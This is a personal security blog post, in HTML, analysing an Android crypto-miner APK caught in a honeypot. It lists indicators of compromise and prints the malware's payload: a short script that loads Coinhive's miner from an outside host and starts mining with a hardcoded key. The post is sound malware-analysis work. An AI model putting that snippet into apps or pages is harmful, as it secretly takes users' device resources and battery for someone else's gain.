<!doctype html><html lang=en dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>Fishing for Malware — Part Two: Android Crypto Miner | Sid's Blog</title>
<meta name=keywords content="sid,lacy,blog,website,cybersecurity,security,computer,honeypot,malware,tech,network">
<meta name=description content="Analysis of malware dropped into my Google Cloud honeypot — pulling apart a rudimentry Android cypto miner">
<meta name=author content="Sid Lacy">
<link rel=canonical href=https://swlacy.com/posts/fishing-for-malware-2/>
<link crossorigin=anonymous href=/assets/css/stylesheet.min.57f2b6dfb92097eb855e02e905de3644361ad2fc5089352e89b93d9a43712dd5.css integrity="sha256-V/K237kgl+uFXgLpBd42RDYa0vxQiTUuibk9mkNxLdU=" rel="preload stylesheet" as=style>
<link rel=preload href=apple-touch-icon.png as=image>
<script defer crossorigin=anonymous src=/assets/js/highlight.min.7680afc38aa6b15ddf158a4f3780b7b1f7dde7e91d26f073e6229bb7a0793c92.js integrity="sha256-doCvw4qmsV3fFYpPN4C3sffd5+kdJvBz5iKbt6B5PJI=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://swlacy.com/favicon.ico>
<link rel=icon type=image/png sizes=16x16 href=https://swlacy.com/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=https://swlacy.com/favicon-32x32.png>
<link rel=apple-touch-icon href=https://swlacy.com/apple-touch-icon.png>
<link rel=mask-icon href=https://swlacy.com/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.92.2">
<noscript>
<style>#theme-toggle,.top-link{display:none}</style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-QFRYSRDLC1"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-QFRYSRDLC1',{anonymize_ip:!1})}</script>
<meta property="og:title" content="Fishing for Malware — Part Two: Android Crypto Miner">
<meta property="og:description" content="Analysis of malware dropped into my Google Cloud honeypot — pulling apart a rudimentry Android cypto miner">
<meta property="og:type" content="article">
<meta property="og:url" content="https://swlacy.com/posts/fishing-for-malware-2/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2022-01-23T00:00:00+00:00">
<meta property="article:modified_time" content="2022-01-23T00:00:00+00:00"><meta property="og:site_name" content="Sid's Blog">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="Fishing for Malware — Part Two: Android Crypto Miner">
<meta name=twitter:description content="Analysis of malware dropped into my Google Cloud honeypot — pulling apart a rudimentry Android cypto miner">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://swlacy.com/posts/"},{"@type":"ListItem","position":3,"name":"Fishing for Malware — Part Two: Android Crypto Miner","item":"https://swlacy.com/posts/fishing-for-malware-2/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Fishing for Malware — Part Two: Android Crypto Miner","name":"Fishing for Malware — Part Two: Android Crypto Miner","description":"Analysis of malware dropped into my Google Cloud honeypot — pulling apart a rudimentry Android cypto miner","keywords":["sid","lacy","blog","website","cybersecurity","security","computer","honeypot","malware","tech","network"],"articleBody":"Information Indicators of Compromise  MD5: 8844985fcd57b0311d1d4cb2ec13a1ef SHA-1: a0c07fe897515e5575a72f94f9dea8c077a410ff SHA-256: 0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257 Package name: com.ufo.miner Connected domain: coinhive.com Unexpected high utilization of Android device resources  File  Magic: APK archive Language: Java Size: 45.43 KB  See this file on VirusTotal\nAs the heading and package name imply, this is a crypto miner developed for Android devices. However, that isn’t particularly interesting on its own, and 45.43 KB is small — suspiciously small — so let’s take a look inside the file.\nSource Extraction $ unzip 0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257.raw.zip Archive: 0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257.raw.zip inflating: META-INF/MANIFEST.MF inflating: META-INF/CERT.SF inflating: META-INF/CERT.RSA extracting: res/drawable-xhdpi-v4/ic_launcher.png inflating: AndroidManifest.xml extracting: res/drawable-hdpi-v4/ic_launcher.png inflating: res/layout/activity_main.xml inflating: assets/run.html extracting: resources.arsc extracting: res/drawable-mdpi-v4/ic_launcher.png inflating: classes.dex extracting: res/drawable-xxhdpi-v4/ic_launcher.png inflating: res/menu/main.xml $ I see an HTML file, some PNG images, and some other files, the extensions of which I am not familiar with. Let’s check them out.\n$ cat assets/run.html script src=\"https://coinhive.com/lib/coinhive.min.js\"script script var miner = new CoinHive.Anonymous('fwW95bBFO91OKUsz1VhlMEQwxmDBz7XE',{ threads:4, throttle: 0.8 }); miner.start(); script Sigh. It remains boring. However, by searching for the crypto wallet hardcoded into the HTML, I came across a presentation from Fortinet, indicating that this CoinHive-related malware may have been a part of the Trinity Android P2P malware bot, which is quite interesting. Alas, that is a rabbit hole for another blog post.\nEach PNG was a rescaled version of the stock Android logo — not much to say beyond that.\nHow I assume this malware works:\n  The victim’s stock web browser embeds into an app frame in the background.\n  Instructions are received from CoinHive.\n  The miner starts working, sending proof of work to the address hardcoded into the script.\n  The victim’s phone gets too hot, or the battery drains too fast; upon seeing the culprit as com.ufo.miner in the power report of the device, the victim promptly uninstalls the application.\n  Personal Thoughts This is a very small application and doesn’t perform any particularly special operations; in fact, I debated including it in this series at all. More interesting that the malware itself to me, however, is the platform it targets.\nIn the context of cryptocurrency mining, Android devices are not particularly powerful, and therefore not as lucrative as most other computing machines. It would take a vast, vast array of Android smartphones/tablets/et cetera to generate even a moderate amount of the more popular cryptocurrencies available today, such as Bitcoin. This issue is exacerbated by the ease of detection; many users infected with this malware, I would reason, could trivially identify its existance via the power usage utility on their respective Android device, thereby shortening runtime.\nA humorus reference to Coinhive’s coinhive.min.js script I found online: “Stack Overflow: [Coinhive header] automatically appears in my website”\nAnd, finally, kudos to Troy Hunt, who bought the Coinhive domain and shut it down.\nThanks so much for reading!\n Fishing for Malware: Part 3 →\n← Fishing for Malware: Part 1\nI am open to comments and criticism — I learn alongside you. Please, do not hesitate to suggest an edit.\n Sid Lacy\nEmail • LinkedIn • GitHub\n","wordCount":"498","inLanguage":"en","datePublished":"2022-01-23T00:00:00Z","dateModified":"2022-01-23T00:00:00Z","author":[{"@type":"Person","name":"Sid Lacy"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://swlacy.com/posts/fishing-for-malware-2/"},"publisher":{"@type":"Organization","name":"Sid's Blog","logo":{"@type":"ImageObject","url":"https://swlacy.com/favicon.ico"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"&&document.body.classList.add('dark')</script>
<header class=header>
<link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.4.0/styles/base16/espresso.min.css integrity="sha512-Alf9gBIx7O9Pn9+n7HJXcwZK6uXCaGDNj5ScAAtNsQ5OpUHBaXLEAaX00Z9N8S9o9lTG7FKgnRB5eXwUQKNu6g==" crossorigin=anonymous referrerpolicy=no-referrer>
<nav class=nav>
<div class=logo>
<a href=https://swlacy.com accesskey=h title=Home>
<img src=https://swlacy.com/apple-touch-icon.png alt=logo aria-label=logo height=" 21px">Sid's Blog</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="Toggle Dark Mode"><svg id="moon" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="moon" class="svg-inline--fa fa-moon" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg><svg id="sun" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="sun" class="svg-inline--fa fa-sun" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentcolor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg>
</button>
</span>
</div>
<ul id=menu>
<li>
<a href=https://swlacy.com/posts title=Search>
<span>Blog</span>
</a>
</li>
<li>
<a href=https://swlacy.com/documents title=Search>
<span>Docs</span>
</a>
</li>
<li>
<a href=https://swlacy.com/resume title=Search>
<span>Resume</span>
</a>
</li>
<li>
<a href=https://swlacy.com/about title=Search>
<span>About</span>
</a>
</li>
<li>
<a href=https://swlacy.com/archive title=Search>
<span>Archive</span>
</a>
</li>
<li>
<a href=https://swlacy.com/search title=Search accesskey=/>
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=https://swlacy.com>Home</a>&nbsp;»&nbsp;<a href=https://swlacy.com/posts/>Posts</a></div>
<h1 class=post-title>
Fishing for Malware — Part Two: Android Crypto Miner
</h1>
<div class=post-description>
Analysis of malware dropped into my Google Cloud honeypot — pulling apart a rudimentry Android cypto miner
</div>
<div class=post-meta><span title="2022-01-23 00:00:00 +0000 UTC">January 23, 2022</span>&nbsp;·&nbsp;3 Minute Read&nbsp;·&nbsp;Sid Lacy
</div>
</header>
<div class=post-content><h2 id=information>Information<a hidden class=anchor aria-hidden=true href=#information>#</a></h2>
<h3 id=indicators-of-compromise>Indicators of Compromise<a hidden class=anchor aria-hidden=true href=#indicators-of-compromise>#</a></h3>
<ul>
<li>MD5: <code>8844985fcd57b0311d1d4cb2ec13a1ef</code></li>
<li>SHA-1: <code>a0c07fe897515e5575a72f94f9dea8c077a410ff</code></li>
<li>SHA-256: <code>0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257</code></li>
<li>Package name: <code>com.ufo.miner</code></li>
<li>Connected domain: <code>coinhive.com</code></li>
<li>Unexpected high utilization of Android device resources</li>
</ul>
<h3 id=file>File<a hidden class=anchor aria-hidden=true href=#file>#</a></h3>
<ul>
<li>Magic: APK archive</li>
<li>Language: Java</li>
<li>Size: 45.43 KB</li>
</ul>
<p><a href=https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257/detection><em>See this file on VirusTotal</em></a></p>
<p>As the heading and package name imply, this is a crypto miner developed for Android devices. However, that isn&rsquo;t particularly interesting on its own, and 45.43 KB is small — suspiciously small — so let&rsquo;s take a look inside the file.</p>
<h2 id=source>Source<a hidden class=anchor aria-hidden=true href=#source>#</a></h2>
<h3 id=extraction>Extraction<a hidden class=anchor aria-hidden=true href=#extraction>#</a></h3>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ unzip 0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257.raw.zip 
Archive:  0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257.raw.zip
  inflating: META-INF/MANIFEST.MF    
  inflating: META-INF/CERT.SF        
  inflating: META-INF/CERT.RSA       
 extracting: res/drawable-xhdpi-v4/ic_launcher.png  
  inflating: AndroidManifest.xml     
 extracting: res/drawable-hdpi-v4/ic_launcher.png  
  inflating: res/layout/activity_main.xml  
  inflating: assets/run.html         
 extracting: resources.arsc          
 extracting: res/drawable-mdpi-v4/ic_launcher.png  
  inflating: classes.dex             
 extracting: res/drawable-xxhdpi-v4/ic_launcher.png  
  inflating: res/menu/main.xml     
  
$
</code></pre></div><p>I see an HTML file, some PNG images, and some other files, the extensions of which I am not familiar with. Let&rsquo;s check them out.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ cat assets/run.html
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html>&lt;<span style=color:#f92672>script</span> <span style=color:#a6e22e>src</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;https://coinhive.com/lib/coinhive.min.js&#34;</span>&gt;&lt;/<span style=color:#f92672>script</span>&gt;
&lt;<span style=color:#f92672>script</span>&gt;
    <span style=color:#66d9ef>var</span> <span style=color:#a6e22e>miner</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#a6e22e>CoinHive</span>.<span style=color:#a6e22e>Anonymous</span>(<span style=color:#e6db74>&#39;fwW95bBFO91OKUsz1VhlMEQwxmDBz7XE&#39;</span>,{
        <span style=color:#a6e22e>threads</span><span style=color:#f92672>:</span><span style=color:#ae81ff>4</span>,
        <span style=color:#a6e22e>throttle</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>0.8</span>
});
    <span style=color:#a6e22e>miner</span>.<span style=color:#a6e22e>start</span>();
&lt;/<span style=color:#f92672>script</span>&gt;
</code></pre></div><p>Sigh. It remains boring. <em>However,</em> by searching for the crypto wallet hardcoded into the HTML, I came across a presentation from <a href=https://www.blackalps.ch/ba-18/files/talks/BlackAlps18-Axelle_Apvrille.pdf>Fortinet</a>, indicating that this CoinHive-related malware may have been a part of the <a href=https://blogs.keysight.com/blogs/tech/nwvs.entry.html/2020/11/22/trinity_p2p_malware-8S4I.html>Trinity Android P2P malware bot</a>, which <em>is</em> quite interesting. Alas, that is a rabbit hole for another blog post.</p>
<p>Each PNG was a rescaled version of the stock Android logo — not much to say beyond that.</p>
<p>How I assume this malware works:</p>
<ol>
<li>
<p>The victim&rsquo;s stock web browser embeds into an app frame in the background.</p>
</li>
<li>
<p>Instructions are received from CoinHive.</p>
</li>
<li>
<p>The miner starts working, sending proof of work to the address hardcoded into the script.</p>
</li>
<li>
<p>The victim&rsquo;s phone gets too hot, or the battery drains too fast; upon seeing the culprit as <em>com.ufo.miner</em> in the power report of the device, the victim promptly uninstalls the application.</p>
</li>
</ol>
<h2 id=personal-thoughts>Personal Thoughts<a hidden class=anchor aria-hidden=true href=#personal-thoughts>#</a></h2>
<p>This is a very small application and doesn&rsquo;t perform any particularly special operations; in fact, I debated including it in this series at all. More interesting that the malware itself to me, however, is the platform it targets.</p>
<p>In the context of cryptocurrency mining, Android devices are not particularly powerful, and therefore not as lucrative as most other computing machines. It would take a vast, vast array of Android smartphones/tablets/et cetera to generate even a moderate amount of the more popular cryptocurrencies available today, such as Bitcoin. This issue is exacerbated by the ease of detection; many users infected with this malware, I would reason, could trivially identify its existance via the power usage utility on their respective Android device, thereby shortening runtime.</p>
<p>A humorus reference to Coinhive&rsquo;s <code>coinhive.min.js</code> script I found online: <a href=https://stackoverflow.com/questions/48375946/script-src-https-coinhive-com-lib-coinhive-min-js-script-automatically-a/48376076#48376076>&ldquo;Stack Overflow: [Coinhive header] automatically appears in my website&rdquo;</a></p>
<p>And, finally, kudos to Troy Hunt, who <a href=https://www.troyhunt.com/i-now-own-the-coinhive-domain-heres-how-im-fighting-cryptojacking-and-doing-good-things-with-content-security-policies/>bought the Coinhive domain and shut it down</a>.</p>
<p>Thanks so much for reading!</p>
<hr>
<p><strong><a href=/media/fishing-for-malware-3>Fishing for Malware: Part 3 →</a></strong><br>
<strong><a href=/media/fishing-for-malware-1>← Fishing for Malware: Part 1</a></strong></p>
<p>I am open to comments and criticism — I learn alongside you. Please, do not hesitate to <a href="mailto:contact@swlacy.com?subject=Blog%20Edit%20Suggestion">suggest an edit</a>.</p>
<hr>
<p>Sid Lacy<br>
<a href="mailto:contact@swlacy.com?subject=Hello!">Email</a> • <a href=https://www.linkedin.com/in/lacysw/>LinkedIn</a> • <a href=https://github.com/lacysw>GitHub</a></p>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://swlacy.com/tags/analysis/>analysis</a></li>
<li><a href=https://swlacy.com/tags/projects/>projects</a></li>
</ul><div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share Fishing for Malware — Part Two: Android Crypto Miner on twitter" href="https://twitter.com/intent/tweet/?text=Fishing%20for%20Malware%20%e2%80%94%20Part%20Two%3a%20Android%20Crypto%20Miner&url=https%3a%2f%2fswlacy.com%2fposts%2ffishing-for-malware-2%2f&hashtags=analysis%2cprojects"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M4e2 32H48C21.5 32 0 53.5.0 80v352c0 26.5 21.5 48 48 48h352c26.5.0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zm-48.9 158.8c.2 2.8.2 5.7.2 8.5.0 86.7-66 186.6-186.6 186.6-37.2.0-71.7-10.8-100.7-29.4 5.3.6 10.4.8 15.8.8 30.7.0 58.9-10.4 81.4-28-28.8-.6-53-19.5-61.3-45.5 10.1 1.5 19.2 1.5 29.6-1.2-30-6.1-52.5-32.5-52.5-64.4v-.8c8.7 4.9 18.9 7.9 29.6 8.3a65.447 65.447.0 01-29.2-54.6c0-12.2 3.2-23.4 8.9-33.1 32.3 39.8 80.8 65.8 135.2 68.6-9.3-44.5 24-80.6 64-80.6 18.9.0 35.9 7.9 47.9 20.7 14.8-2.8 29-8.3 41.6-15.8-4.9 15.2-15.2 28-28.8 36.1 13.2-1.4 26-5.1 37.8-10.2-8.9 13.1-20.1 24.7-32.9 34z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Fishing for Malware — Part Two: Android Crypto Miner on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fswlacy.com%2fposts%2ffishing-for-malware-2%2f"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M4e2 32H48A48 48 0 000 80v352a48 48 0 0048 48h137.25V327.69h-63V256h63v-54.64c0-62.15 37-96.48 93.67-96.48 27.14.0 55.52 4.84 55.52 4.84v61h-31.27c-30.81.0-40.42 19.12-40.42 38.73V256h68.78l-11 71.69h-57.78V480H4e2a48 48 0 0048-48V80a48 48 0 00-48-48z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Fishing for Malware — Part Two: Android Crypto Miner on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fswlacy.com%2fposts%2ffishing-for-malware-2%2f&title=Fishing%20for%20Malware%20%e2%80%94%20Part%20Two%3a%20Android%20Crypto%20Miner"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M283.2 345.5c2.7 2.7 2.7 6.8.0 9.2-24.5 24.5-93.8 24.6-118.4.0-2.7-2.4-2.7-6.5.0-9.2 2.4-2.4 6.5-2.4 8.9.0 18.7 19.2 81 19.6 100.5.0 2.4-2.3 6.6-2.3 9 0zm-91.3-53.8c0-14.9-11.9-26.8-26.5-26.8-14.9.0-26.8 11.9-26.8 26.8.0 14.6 11.9 26.5 26.8 26.5 14.6.0 26.5-11.9 26.5-26.5zm90.7-26.8c-14.6.0-26.5 11.9-26.5 26.8.0 14.6 11.9 26.5 26.5 26.5 14.9.0 26.8-11.9 26.8-26.5.0-14.9-11.9-26.8-26.8-26.8zM448 80v352c0 26.5-21.5 48-48 48H48c-26.5.0-48-21.5-48-48V80c0-26.5 21.5-48 48-48h352c26.5.0 48 21.5 48 48zm-99.7 140.6c-10.1.0-19 4.2-25.6 10.7-24.1-16.7-56.5-27.4-92.5-28.6l18.7-84.2 59.5 13.4c0 14.6 11.9 26.5 26.5 26.5 14.9.0 26.8-12.2 26.8-26.8.0-14.6-11.9-26.8-26.8-26.8-10.4.0-19.3 6.2-23.8 14.9l-65.7-14.6c-3.3-.9-6.5 1.5-7.4 4.8l-20.5 92.8c-35.7 1.5-67.8 12.2-91.9 28.9-6.5-6.8-15.8-11-25.9-11-37.5.0-49.8 50.4-15.5 67.5-1.2 5.4-1.8 11-1.8 16.7.0 56.5 63.7 102.3 141.9 102.3 78.5.0 142.2-45.8 142.2-102.3.0-5.7-.6-11.6-2.1-17 33.6-17.2 21.2-67.2-16.1-67.2z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Fishing for Malware — Part Two: Android Crypto Miner on ycombinator" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fswlacy.com%2fposts%2ffishing-for-malware-2%2f&t=Fishing%20for%20Malware%20%e2%80%94%20Part%20Two%3a%20Android%20Crypto%20Miner"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M4e2 32H48C21.5 32 0 53.5.0 80v352c0 26.5 21.5 48 48 48h352c26.5.0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zM21.2 229.2H21c.1-.1.2-.3.3-.4.0.1.0.3-.1.4zm218 53.9V384h-31.4V281.3L128 128h37.3c52.5 98.3 49.2 101.2 59.3 125.6 12.3-27 5.8-24.4 60.6-125.6H320l-80.8 155.1z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Fishing for Malware — Part Two: Android Crypto Miner on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fswlacy.com%2fposts%2ffishing-for-malware-2%2f&title=Fishing%20for%20Malware%20%e2%80%94%20Part%20Two%3a%20Android%20Crypto%20Miner"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M416 32H31.9C14.3 32 0 46.5.0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6.0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3.0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2.0 38.5 17.3 38.5 38.5.0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6.0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2.0 79.7 44.3 79.7 101.9V416z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share Fishing for Malware — Part Two: Android Crypto Miner on whatsapp" href="https://api.whatsapp.com/send?text=Fishing%20for%20Malware%20%e2%80%94%20Part%20Two%3a%20Android%20Crypto%20Miner%20-%20https%3a%2f%2fswlacy.com%2fposts%2ffishing-for-malware-2%2f"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path d="M224 122.8c-72.7.0-131.8 59.1-131.9 131.8.0 24.9 7 49.2 20.2 70.1l3.1 5-13.3 48.6 49.9-13.1 4.8 2.9c20.2 12 43.4 18.4 67.1 18.4h.1c72.6.0 133.3-59.1 133.3-131.8.0-35.2-15.2-68.3-40.1-93.2-25-25-58-38.7-93.2-38.7zm77.5 188.4c-3.3 9.3-19.1 17.7-26.7 18.8-12.6 1.9-22.4.9-47.5-9.9-39.7-17.2-65.7-57.2-67.7-59.8s-16.2-21.5-16.2-41 10.2-29.1 13.9-33.1c3.6-4 7.9-5 10.6-5 2.6.0 5.3.0 7.6.1 2.4.1 5.7-.9 8.9 6.8 3.3 7.9 11.2 27.4 12.2 29.4s1.7 4.3.3 6.9c-7.6 15.2-15.7 14.6-11.6 21.6 15.3 26.3 30.6 35.4 53.9 47.1 4 2 6.3 1.7 8.6-1 2.3-2.6 9.9-11.6 12.5-15.5 2.6-4 5.3-3.3 8.9-2 3.6 1.3 23.1 10.9 27.1 12.9s6.6 3 7.6 4.6c.9 1.9.9 9.9-2.4 19.1zM4e2 32H48C21.5 32 0 53.5.0 80v352c0 26.5 21.5 48 48 48h352c26.5.0 48-21.5 48-48V80c0-26.5-21.5-48-48-48zM223.9 413.2c-26.6.0-52.7-6.7-75.8-19.3L64 416l22.5-82.2c-13.9-24-21.2-51.3-21.2-79.3C65.4 167.1 136.5 96 223.9 96c42.4.0 82.2 16.5 112.2 46.5 29.9 30 47.9 69.8 47.9 112.2.0 87.4-72.7 158.5-160.1 158.5z"/></svg>
</a>
</div>
</footer>
</article>
</main>
<footer class=footer>
<span>Copyright &copy; 2022 Sid Lacy •
Last Built 2022.02.12 UTC •
<a href=/attribution>Attribution</a>
</span>
</footer>
<a href=#top aria-label="go to top" title="Jump to Top" class=top-link id=top-link accesskey=g><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="arrow-up" class="svg-inline--fa fa-arrow-up fa-w-14" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentcolor" d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6.0-33.9L207 39c9.4-9.4 24.6-9.4 33.9.0l194.3 194.3c9.4 9.4 9.4 24.6.0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3.0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg>
</a>
<script>let menu=document.getElementById('menu');menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='Copy ⧉';function d(){a.innerText='Copied!',setTimeout(()=>{a.innerText='Copy ⧉'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
<script src=https://cdnjs.cloudflare.com/ajax/libs/medium-zoom/1.0.6/medium-zoom.min.js integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S+Yti0U7QtuZvQ==" crossorigin=anonymous referrerpolicy=no-referrer></script>
<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(a=>{mediumZoom(a,{background:'#00000000'})})</script></body>
</html>